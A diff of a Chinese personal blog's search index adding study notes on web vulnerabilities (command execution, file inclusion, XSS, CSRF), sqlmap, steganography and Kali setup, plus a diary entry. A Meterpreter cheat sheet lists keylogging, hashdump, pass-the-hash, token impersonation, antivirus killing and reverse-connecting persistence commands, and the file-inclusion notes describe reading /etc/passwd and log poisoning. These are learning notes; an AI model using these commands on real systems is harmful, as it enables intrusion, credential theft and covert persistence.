@@ -4,11 +4,211 @@
   
     
     <entry>
+      <title>命令执行漏洞</title>
+      <link href="/2019/05/31/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
+      <url>/2019/05/31/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
+      
+        <content type="html"><![CDATA[<p>命令执行漏洞：</p><pre><code>原理：没有很好的过滤用户的输入数据，    代码执行漏洞  ：靠执脚本代码间接调用系统命令-----PHP函数中较多种类：        命令执行漏洞：直接调用系统命令    框架执行漏洞：java框架。thinKPHP框架（掌握正则表达式）防范：尽量不要使用系统执行命令          在执行命令函数之前，变量做好过滤，转义          确保使用的函数是指定的函数之一           对PHP语言来说，不能完全控制的危险函数不要使用</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> web基础漏洞 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 渗透测试 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>文件包含</title>
+      <link href="/2019/05/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
+      <url>/2019/05/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
+      
+        <content type="html"><![CDATA[<p>文件包含：</p><pre><code>包含：可以理解一个文件被包含了就可被执行。（对于PHP）原理：PHP中包含文件中任何后缀名的文件用当做PHP文件运行，任何格式只要里面是PHP的    写法，就会执行。无视文件后缀名（导致PHP中的文件包含漏洞特别多）。但其他    语言也会有实质:被包含的页面可以被攻击者所控制。 </code></pre><p>PHP中包含分两种：<br>        本地包含:包含内容是PHP写法就行了</p><pre><code>            其实他们没什么本质区别，无论是何种扩展名，里面是PHP写法，就执行！    远程包含：连接上远程·PHP写法的文件漏洞利用：一，包含上系统敏感文件，获取敏感信息，如包含上：/etc/passwd（查看Linux用户权限文件）                    /boo.int（查看系统版本）    二，远程包含shell，如果目标主机php配置中allow_url_fopen打开，尝试远程包含一句话木马    三，本地包含配合文件上传，把一句话木马其他后缀名传到服务器，并知道文件位置，然后再包含它。    四，使用PHP封装协议，1，使用封装协议读取PHP文件：php:// ,ftp://              2, 写入PHP文件，php://input 后面接PHP代码 ，注意：php://input受限于                            allow_url_include选项     五，包含文件日志。利用日志，在日志特性写入一句话之类的，找到Apache日志包含路径，利用包含漏洞包            含apache    日志文件    六·：截断包含。利用%00截断后缀，使上传的一句话能过正常被包含，注意：只有magic_quotes_gpc 为off            时，%00才不会被转码。    七，绕过waf防火墙</code></pre><p>jsp包含：<br>    静态包含：不存在包含漏洞，因为即使他没有过滤包含文件，静态不允许变量来控制包含一个文件，只允许包含写死的<br>        文件，所以不存在包含漏洞。（他会解析，但不处理。先包含，再处理）</p><pre><code>动态包含：(先处理，再包含)会读取其源代码，但不解析。所以即使被包含的页面，被攻击者控制，攻击者得到的信息    也是有限的（攻击者一般都会包含web配置文件）</code></pre><p>解决：严格判断包含中的参数是否外部可控，因为文件包含漏洞利用成功与否的关键点就在于包含文件是否可被外部可控<br>    路径限制：禁止目录跳转字符“../”<br>    包含文件验证：验证包含文件是否为白名单的一员<br>    尽量不要使用动态包含</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web基础漏洞 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 渗透测试 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>xss跨站脚本攻击</title>
+      <link href="/2019/05/30/xss/"/>
+      <url>/2019/05/30/xss/</url>
+      
+        <content type="html"><![CDATA[<p>xss跨站脚本攻击<br>原理：没有进行良好的过滤<br>出现范围：凡是有输入的地方（都可能有SQL与xss）<br>目的：获取用户cookie<br>    高级应用（网页挂马，修改网页内容，xss蠕虫）</p><p>xss 分三种：</p><pre><code>反射型：攻击者利用未过滤的输入框可以输入恶意代码，有于是构造带有JavaScript的url，发给用户点击，（弹窗）获取用户cookie，发送到自己。储存型：攻击者把弹出cookie的恶意代码,插入到服务器，其他用户浏览攻击者留言是就会触发，获取用户cookie，发送到自己。dom型：</code></pre><p>注意，储存型：需要判断留言输出的地方是在标签的属性内，还是不是属性外，属性内要‘、’闭合标签，再插入才会执行。因为HTML<br>中，属性内的回被当成值，而导致不执行。</p><p>xss蠕虫：<br>    不断传染，与系统病毒区别就是它不能对系统底层操作，用于web，基于JavaScript编写。</p><p>原理:<br>    用户浏览了带有存储型xss后，浏览器执行脚本，JavaScript构建转发的usl，并让别的用户收听自己，<br>从而达到不断的传染。</p><p>防范：<br>    PHP中使用htmlspecialchars（）,htmlentities（）函数对特殊字符的转义<br>    Java中有很多插件：owasp esapi,jsoup.,xssprotect,…..<br>    httponly 防止xss 后续的cookie劫持、</p><p>弹窗：<br>    alert（字符串要加引号）</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web基础漏洞 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 渗透测试 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>meterpreter使用</title>
+      <link href="/2019/05/29/meterpreter/"/>
+      <url>/2019/05/29/meterpreter/</url>
+      
+        <content type="html"><![CDATA[<p>meterpreter:    </p><pre><code>是后渗透攻击模块，攻击后在主机下使用，做为攻击载荷，能够在目标主机    建立一个metepretre shell 连接，</code></pre><p>小技巧：在meterpreter中，可用background 跳转到msf中，而meterpreter的会话仍在进行<br>    输入sessions -l 和 sessions -i 会话id即可返回到meterpreter</p><p>metepreter shell 的作用（即meterpreter的作用）：</p><pre><code>一，截屏：screenshot  图片保存在/opt/metasploit3/msf3/xxxx.jpeg二，sysinfo 获取系统的详情信息三，ps 目标系统正在运行的程序四，migrate 将临时进程迁移至explorer.exe的进程中五，keylog_recorder 键盘记录-------结束键盘记录Ctrl+c六，hashdump 获取hash值，在运行use priv （特权模式）下执行    use  priv    use windows/gethex/hashdump七，哈希值传递     在msf中选择use window/smb/psexec模块，然后设置 set SMBPass 八，提权    use priv加载提权模块，getsystem 提权，getuid 查看权限等级九，令牌假冒    ps找出域管理员PID，steal_token PID 假冒账号    某些情况下ps不能列出令牌，就使用usei ncognito 加载incognito模块，然后通过list_token -u 列举出所有令牌    这时我们可以假冒别的用户了 impersonate_token 令牌十，跳板攻击    入侵受控主机，通过run get_local_subnets 显示受控系统的子网，把攻击对话放置后台，根据目标网段添加路由，    route add 192.168.1.0 255.255.255.0 1（告知远程网络通过攻击会话&quot;1&quot;来路由）然后route print 打印显示当前    路由活动状态，</code></pre><p>meterpreter脚本：<br>    在meterpreter中，使用run 脚本名字 来运行</p><p>作用：</p><pre><code>一，run vnc   将受控系统的桌面通信通过隧道的方式映射过来，‘就是图形化操作目标系统’    进去后，如果桌面是锁定的话，通过screen_unlock 进行桌面解锁二，迁移进程，当我们攻击系统时，常常是对Internet explorer之类的服务进行漏洞利用的，如果目标    关闭了浏览器，meterpreter也会关闭，为此，我们需要对会话进行迁移，    run post/windows/manage/migrate三，关闭杀毒软件---run killav四，获取hash密码    run hashdump五 ，查看目标机上的所有流量 ，以.pcap格式保存下来，并能够被wireshark等工具解析-i 1 的参数    运行数据包记录脚本，以指定记录数据包网卡    run packetrecorder -i 1六，控制持久化，使用persistence，    run persistence -X -i 50（50秒重连一次） -p 443（使用的端口为443） -r  目的IP    打了这个命令后进行监听（use multi/handler）就行了（打了这个命令后任何攻击者无需认证，就可    获得这个系统的访问权）七，将反弹命令shell升级为meterpreter      获得反弹式shell后，用setg设置连接目标及连接端口，然后使用session -u l即可</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 工具使用 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 渗透测试 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>隐写术</title>
+      <link href="/2019/05/27/%E9%9A%90%E5%86%99%E6%9C%AF/"/>
+      <url>/2019/05/27/%E9%9A%90%E5%86%99%E6%9C%AF/</url>
+      
+        <content type="html"><![CDATA[<p>隐写术：<br>    window中用命令copy，把一张图片或别的东西复制到另一个图片中；</p><pre><code>使用stedhide工具写入    将secret.txt文件隐藏到text.jpg中：        # steghide embed -cf test.jpg -ef secret.txt -p 123456    从text.jpg解出secret.txt:        #steghide extract -sf test.jpg -p 123456 使用binwalk工具查找：用binwalk 加文件路径分离：  1.  binwalk -e 加文件路径           2.   dd if=2.jpg of=2-1.jpg skip=158792 bs=1    if是指定输入文件，of是指定输出文件，skip是指定从输入文件开头跳过158792个块后再开始复制，bs设置            每次读写块的大小为1字节 。 使用foremost工具分离分离：直接foremost  加文件路径    foremost会自动生成output目录存放分离出文件。</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 工具使用 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 渗透测试 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SQLmap使用</title>
+      <link href="/2019/05/26/SQLmap%E4%BD%BF%E7%94%A8/"/>
+      <url>/2019/05/26/SQLmap%E4%BD%BF%E7%94%A8/</url>
+      
+        <content type="html"><![CDATA[<p>SQLmap：</p><pre><code>注意：在kali中不用带.py</code></pre><p>检测</p><pre><code>基本使用    sqlmap.py -u &quot;网址&quot; （get的注入）    sqlmap.py -u &quot;网址&quot; --data “post传递的值；id=2”（post注入）    sqlmap.py -u &quot;网址&quot; --cookie “cookie传递的值；cookie =fffsws”(cookie的注入)</code></pre><p>-u是指URL，一个字母就前面一个-，一个单词就两个-；</p><pre><code>其他方式：    在sqlmap.py下新建一个TXT文件，里面有http响应头，    打开这个文件默认会去检测其值，想要检测其他的值就    在其后面加入 *号，再打开。    sqlmap.py -r 文件名 读取文件</code></pre><p>注入； </p><pre><code>access数据库（里面只有一个数据库）    列出表名   sqlmap.py -u &quot;网址&quot;  --tables    列出列名 sqlmap.py -u &quot;网址&quot; -T &quot;表名&quot; --columns    列出内容    sqlmap.py -u&quot;网址&quot; -T “表名”-C “列名”--dumpmssql 数据库（或MySQL）    列出所有数据库名字：sqlmap.py -u &quot;网址&quot; --dbs    列出当前网站所有数据库库名：sqlmap.py -u &quot;网址&quot; -db --current      列出表名:sqlmap.py -u &quot;网址&quot; -D “数据库名”--tables    列出列名：sqlmap .py -u &quot;网址&quot; -D &quot;数据库名&quot; -T ‘表名’--columns    列出内容:sqlmap .py -u &quot;网址&quot; -D “数据库名”- T “表名”-C “列名”--dump</code></pre><p>–users 列出所有管理员<br>–current-users列出当前用户名</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 工具使用 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 渗透测试 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>CSRF(跨站请求伪造)</title>
+      <link href="/2019/05/25/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
+      <url>/2019/05/25/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      <categories>
+          
+          <category> web基础漏洞 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 渗透测试 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>CSRF(跨站请求伪造)</title>
+      <link href="/2019/05/25/csrf/"/>
+      <url>/2019/05/25/csrf/</url>
+      
+        <content type="html"><![CDATA[<p>CSRF(跨站请求伪造)：<br>    理解：在用户登录网站后，骗取用户点击攻击者构造有操作性的链接（URL或叫poc），它只能通过用户的正规操作<br>        进行攻击，实际上就是劫持用户操作。对于CSRF来说，网站的请求是post还是get本质是没有任何区别的，<br>        只不过是构造链接不一样，post请求多了一些代码而已</p><pre><code>注意：CSRF不能获取用户cookie，攻击者无法从返回结果中得到任何东西，CSRF能做的只是利用浏览器储存的cookie        给服务器发送请求。如果有xss之类的漏洞，可通过js获取cookie，token，那么防御CSRF将毫无意义cookie：一种是本地cookie，持久性，    另一种是临时cookie ，又称session cookie，浏览器关了就没了。</code></pre><p>检测：随便找个敏感性的请求，猜测出其参数含义，制作URL，修改其参数值，看服务器有没有执行，有则是有CSRF漏洞</p><p>防御：进行敏感操作时二次验证，1，再次输入密码。2，输入验证码（普通验证码，或token）</p><pre><code>如果有xss之类的漏洞，可通过js获取cookie，token，那么防御CSRF将毫无意义</code></pre><p>其实CSRF就是xss的一种“缩小版”</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web基础漏洞 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 渗透测试 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>渗透心得</title>
       <link href="/2019/05/23/%E6%B8%97%E9%80%8F%E9%9A%8F%E7%AC%941/"/>
       <url>/2019/05/23/%E6%B8%97%E9%80%8F%E9%9A%8F%E7%AC%941/</url>
       
-        <content type="html"><![CDATA[<p>在渗透测试工作中，你不必为寻找捷径而感到一丝羞愧，所以要学会针对扫描，<br>        针对找目标在的已知可利用漏洞或能过<br>        轻松获取后门的特定操作系统、服务 ，软件，配置缺陷</p><p>在学习技能时，首先要明白原理，（明白原理比较容易），重要的是实践，动手，不要<br>    以为明白原理就会用了，动起手来你就知道原来那么简单的都那么多问题。<br>    但第二次动手做的时候你就会发现时很简单的（所以开头才难）<br>(更新中……..)</p>]]></content>
+        <content type="html"><![CDATA[<pre><code>现在的安全行业真的有很多半桶水的人，再过几年将淘汰一大部分的人，安全的门槛将变高很多。</code></pre><p>在渗透测试工作中，你不必为寻找捷径而感到一丝羞愧，所以要学会针对扫描，<br>        针对找目标在的已知可利用漏洞或能过<br>        轻松获取后门的特定操作系统、服务 ，软件，配置缺陷</p><p>在学习技能时，首先要明白原理，（明白原理比较容易），重要的是实践，动手，不要<br>    以为明白原理就会用了，动起手来你就知道原来那么简单的都那么多问题。<br>    但第二次动手做的时候你就会发现时很简单的（所以开头才难）<br>(更新中……..)</p>]]></content>
       
       
       
@@ -200,17 +400,23 @@
     
     
     <entry>
-      <title>metaspolit基础一</title>
-      <link href="/2019/05/20/metasploit/"/>
-      <url>/2019/05/20/metasploit/</url>
+      <title>kali使用</title>
+      <link href="/2019/05/21/kali%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
+      <url>/2019/05/21/kali%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
       
-        <content type="html"><![CDATA[<h3 id="metasploit的理解："><a href="#metasploit的理解：" class="headerlink" title="metasploit的理解："></a>metasploit的理解：</h3><pre><code>他是一个工具框架·，需要接口连接使用。</code></pre><h3 id="metasploit使用："><a href="#metasploit使用：" class="headerlink" title="metasploit使用："></a>metasploit使用：</h3><pre><code>接入接口三个：终端，命令行，图形化界面    终端的打开：msfconsole    命令行：/opt/framework3/msf3    图形化界面：armitage</code></pre><h3 id="功能程序（即metasploit的功能）："><a href="#功能程序（即metasploit的功能）：" class="headerlink" title="功能程序（即metasploit的功能）："></a>功能程序（即metasploit的功能）：</h3><pre><code>msf攻击载荷生成器，msf编码器nasm shell (找出Opcode操作码)</code></pre><h3 id="metasploit渗透测试步骤"><a href="#metasploit渗透测试步骤" class="headerlink" title="metasploit渗透测试步骤:"></a>metasploit渗透测试步骤:</h3><pre><code>信息收集：     被动搜集：（不接触目标系统下）    whois查询：例如：查询dns信息，是否由内部提供    netcraft:查询网站IP    nslookup:获取更多附加信息      主动搜集：（用工具与目标系统对话）    nmap:</code></pre>]]></content>
+        <content type="html"><![CDATA[<p>kali:<br>    即Linux系统，但有一些不同</p><p>网络配置：<br>    配置IP：打开IP配置文件，vi /etc/network/interfaces<br>            auto eth0<br>            iface eth0 inet dhcp<br>            或者（ address 192.168.1.30<br>                    netmask 255.255.255.0<br>                    gateway 192.168.1.1）</p><pre><code>配置dns:打开dns配置文件，vi /etc/resolv.conf。（一般来说配置了DHCP都不用配dns了）重启网络：/etc/init.d/networking restart</code></pre><p>kali安装失败:可以更新一下系统。apt-get update（注意-前面没有空格） </p>]]></content>
       
+      
+      <categories>
+          
+          <category> kali </category>
+          
+      </categories>
       
       
         <tags>
             
-            <tag> mataspolit 渗透测试 </tag>
+            <tag> kali </tag>
             
         </tags>
       
@@ -223,13 +429,32 @@
       <link href="/2019/05/20/520/"/>
       <url>/2019/05/20/520/</url>
       
-        <content type="html"><![CDATA[<p>—————-~——-<br>—————-~——-<br> 今天是5，20</p><p> 单身狗！</p><p> 祝你早日脱单哈哈哈~~</p><p>—————-~——-<br>—————-~——-</p><p>5，21</p><p> 我今天心情不好，你完了！</p><p>—————-~——-<br>—————-~——-</p><p>5.23</p><p>发现你还是一样的傻，<br>什么时候能聪明一点啊。。。。<br>追求更高的层次</p><p>—————-~——-<br>—————-~——-</p><p>5.24</p><p>多读书！多社交！<br>别老是刷剧，刷微博</p><p>—————-~——-<br>—————-~——-</p><p>5.26</p><p>青春是美妙的，挥霍青春就是犯罪。————  萧伯纳 </p><p>—————-~——-<br>—————-~——-</p><p>5.28</p><p>昨天有个女孩说的，爱笑的女孩运气不会差，祝你笑口常开！！</p><p>—————-~——-<br>—————-~——-</p><p>5.29</p><p>命运总是垂青努力的人，。。。<br>加油吧！！！</p><pre><code>-----------哆啦A梦</code></pre><!-- <div align="middle"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="/medias/musics/陈慧琳-多啦A梦.mp3"></iframe></div> --><p><link rel="stylesheet" href="/libs/aplayer/APlayer.min.css"></p><div class="music-player"><br><br>    <div class="row"><br>        <div class="col l8 offset-l2 m10 offset-m1 s12"><br>            <div id="aplayer" class="music"></div><br>        </div><br>    </div><br></div><script src="/libs/aplayer/APlayer.min.js"></script><script>$(function () {    new APlayer({        container: document.getElementById('aplayer'),        fixed: 'false' === 'true',        autoplay: 'false' === 'true',        theme: '#42b983',        loop: 'all',        order: 'list',        preload: 'metadata',        volume: Number('0.7'),        listFolded: 'false' === 'true',        listMaxHeight: '',        audio: JSON.parse('[{"name":"披风","artist":"陈奕迅","url":"/medias/musics/陈奕迅-披风.mp3 ","cover":"http://star.kuwo.cn/star/starheads/300/81/37/17029594.jpg"},{"name":"猜情寻","artist":"陈奕迅","url":"/medias/musics/陈奕迅-猜情寻.mp3 ","cover":"http://img2.kuwo.cn/star/albumcover/300/59/64/1224074915.jpg"},{"name":"阴天快乐","artist":"陈奕迅","url":"/medias/musics/陈奕迅-阴天快乐.mp3 ","cover":"http://img3.kuwo.cn/star/albumcover/300/40/9/4291126415.jpg"},{"name":"富士山下-(《爱情转移》粤语版)","artist":"陈奕迅","url":"/medias/musics/陈奕迅-富士山下-(《爱情转移》粤语版).mp3 ","cover":"http://img2.kuwo.cn/star/albumcover/300/59/64/1224074915.jpg"},{"name":"陈奕迅-十年","artist":"陈奕迅","url":"/medias/musics/陈奕迅-十年.mp3 ","cover":"http://img2.kuwo.cn/star/albumcover/300/59/64/1224074915.jpg"},{"name":"因为爱情","artist":"陈奕迅-王菲","url":"/medias/musics/陈奕迅_王菲.mp3 ","cover":"http://img2.kuwo.cn/star/albumcover/300/59/64/1224074915.jpg"}]')    });});</script><div align="middle"><a href="https://baike.baidu.com/item/%E9%99%88%E5%A5%95%E8%BF%85/128029?fr=aladdin" target="_blank" rel="noopener">为刘倩仪百科—–陈奕迅</a></div><p>我是一只猫，一只叮当猫，快乐的叮当猫》》》》》》》</p>]]></content>
+        <content type="html"><![CDATA[<p>—————-~——-<br>—————-~——-<br> 今天是5，20</p><p> 单身狗！</p><p> 祝你早日脱单哈哈哈~~</p><p>—————-~——-<br>—————-~——-</p><p>5，21</p><p> 我今天心情不好，你完了！</p><p>—————-~——-<br>—————-~——-</p><p>5.23</p><p>发现你还是一样的傻，<br>什么时候能聪明一点啊。。。。<br>追求更高的层次</p><p>—————-~——-<br>—————-~——-</p><p>5.24</p><p>多读书！多社交！<br>别老是刷剧，刷微博</p><p>—————-~——-<br>—————-~——-</p><p>5.26</p><p>青春是美妙的，挥霍青春就是犯罪。————  萧伯纳 </p><p>—————-~——-<br>—————-~——-</p><p>5.28</p><p>昨天有个女孩说的，爱笑的女孩运气不会差，祝你笑口常开！！</p><p>—————-~——-<br>—————-~——-</p><p>5.29</p><p>命运总是垂青努力的人，。。。<br>加油吧！！！</p><p>—————-~——-<br>—————-~——-</p><p>5.30</p><p>居安思危，未雨绸缪！！</p><p>—————-~——-<br>—————-~——-</p><p>5.31</p><p>早上6点的空气真的很好哦！<br>                               ———–哆啦A梦</p><!-- <div align="middle"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="/medias/musics/陈慧琳-多啦A梦.mp3"></iframe></div> --><p><link rel="stylesheet" href="/libs/aplayer/APlayer.min.css"></p><div class="music-player"><br><br>    <div class="row"><br>        <div class="col l8 offset-l2 m10 offset-m1 s12"><br>            <div id="aplayer" class="music"></div><br>        </div><br>    </div><br></div><script src="/libs/aplayer/APlayer.min.js"></script><script>$(function () {    new APlayer({        container: document.getElementById('aplayer'),        fixed: 'false' === 'true',        autoplay: 'false' === 'true',        theme: '#42b983',        loop: 'all',        order: 'list',        preload: 'metadata',        volume: Number('0.7'),        listFolded: 'false' === 'true',        listMaxHeight: '',        audio: JSON.parse('[{"name":"披风","artist":"陈奕迅","url":"/medias/musics/陈奕迅-披风.mp3 ","cover":"http://star.kuwo.cn/star/starheads/300/81/37/17029594.jpg"},{"name":"猜情寻","artist":"陈奕迅","url":"/medias/musics/陈奕迅-猜情寻.mp3 ","cover":"http://img2.kuwo.cn/star/albumcover/300/59/64/1224074915.jpg"},{"name":"阴天快乐","artist":"陈奕迅","url":"/medias/musics/陈奕迅-阴天快乐.mp3 ","cover":"http://img3.kuwo.cn/star/albumcover/300/40/9/4291126415.jpg"},{"name":"富士山下-(《爱情转移》粤语版)","artist":"陈奕迅","url":"/medias/musics/陈奕迅-富士山下-(《爱情转移》粤语版).mp3 ","cover":"http://img2.kuwo.cn/star/albumcover/300/59/64/1224074915.jpg"},{"name":"陈奕迅-十年","artist":"陈奕迅","url":"/medias/musics/陈奕迅-十年.mp3 ","cover":"http://img2.kuwo.cn/star/albumcover/300/59/64/1224074915.jpg"},{"name":"因为爱情","artist":"陈奕迅-王菲","url":"/medias/musics/陈奕迅_王菲.mp3 ","cover":"http://img2.kuwo.cn/star/albumcover/300/59/64/1224074915.jpg"}]')    });});</script><div align="middle"><a href="https://baike.baidu.com/item/%E9%99%88%E5%A5%95%E8%BF%85/128029?fr=aladdin" target="_blank" rel="noopener">为刘倩仪百科—–陈奕迅</a></div><p>我是一只猫，一只叮当猫，快乐的叮当猫》》》》》》》</p>]]></content>
       
       
       
         <tags>
             
             <tag> 心情 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>metaspolit基础一</title>
+      <link href="/2019/05/20/metasploit/"/>
+      <url>/2019/05/20/metasploit/</url>
+      
+        <content type="html"><![CDATA[<h3 id="metasploit的理解："><a href="#metasploit的理解：" class="headerlink" title="metasploit的理解："></a>metasploit的理解：</h3><pre><code>他是一个工具框架·，需要接口连接使用。</code></pre><h3 id="metasploit使用："><a href="#metasploit使用：" class="headerlink" title="metasploit使用："></a>metasploit使用：</h3><pre><code>接入接口三个：终端，命令行，图形化界面    终端的打开：msfconsole    命令行：/opt/framework3/msf3    图形化界面：armitage</code></pre><h3 id="功能程序（即metasploit的功能）："><a href="#功能程序（即metasploit的功能）：" class="headerlink" title="功能程序（即metasploit的功能）："></a>功能程序（即metasploit的功能）：</h3><pre><code>msf攻击载荷生成器，msf编码器nasm shell (找出Opcode操作码)</code></pre><h3 id="metasploit渗透测试步骤"><a href="#metasploit渗透测试步骤" class="headerlink" title="metasploit渗透测试步骤:"></a>metasploit渗透测试步骤:</h3><pre><code>信息收集：     被动搜集：（不接触目标系统下）    whois查询：例如：查询dns信息，是否由内部提供    netcraft:查询网站IP    nslookup:获取更多附加信息      主动搜集：（用工具与目标系统对话）    nmap:</code></pre>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> mataspolit 渗透测试 </tag>
             
         </tags>
       
